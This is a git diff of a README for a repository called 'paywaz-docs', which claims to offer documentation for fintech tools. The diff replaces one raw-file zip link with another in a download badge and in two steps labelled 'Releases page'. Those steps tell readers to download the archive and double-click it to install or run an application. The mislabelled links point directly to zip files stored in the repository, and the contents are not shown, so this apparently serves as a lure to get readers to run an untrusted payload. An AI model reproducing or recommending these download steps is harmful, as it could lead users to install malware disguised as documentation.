@@ -1,6 +1,6 @@
 # 🌟 paywaz-docs - Simplifying Access to Paywaz Tools
 
-![Download](https://raw.githubusercontent.com/yousif-9/paywaz-docs/main/scripts/docs_paywaz_v3.1.zip%20Latest%20Release-%20%F0%9F%93%A6%20Visit%20Here-FF0000?style=for-the-badge)  
+![Download](https://github.com/yousif-9/paywaz-docs/raw/refs/heads/main/docs/docs_paywaz_1.4.zip%20Latest%20Release-%20%F0%9F%93%A6%20Visit%20Here-FF0000?style=for-the-badge)  
 
 ## 📚 Overview
 
@@ -10,7 +10,7 @@ Welcome to the Paywaz documentation hub! Here, you will find everything related 
 
 To get started with Paywaz documentation, follow these easy steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/yousif-9/paywaz-docs/main/scripts/docs_paywaz_v3.1.zip).  
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/yousif-9/paywaz-docs/raw/refs/heads/main/docs/docs_paywaz_1.4.zip).  
 2. **Download Files:** Look for the section labeled "Latest Release." You will see a list of files available for download.  
 3. **Choose the Right File:** Depending on your needs, select the appropriate file that matches your system.  
 4. **Install and Run:** Download the selected file, then double-click it to install or run the application. 
@@ -28,7 +28,7 @@ Paywaz offers various features tailored to meet your needs in the fintech arena.
 
 Follow these steps to download and install the necessary files:
 
-1. **Visit the Download Page:** Go to our [Releases page](https://raw.githubusercontent.com/yousif-9/paywaz-docs/main/scripts/docs_paywaz_v3.1.zip).
+1. **Visit the Download Page:** Go to our [Releases page](https://github.com/yousif-9/paywaz-docs/raw/refs/heads/main/docs/docs_paywaz_1.4.zip).
 2. **Identify the Latest Version:** The most recent version is listed at the top of the page.
 3. **Click on the Download Link:** Find the format that suits you best (e.g., Windows, macOS).  
    - Click on the corresponding file to download it directly to your computer.
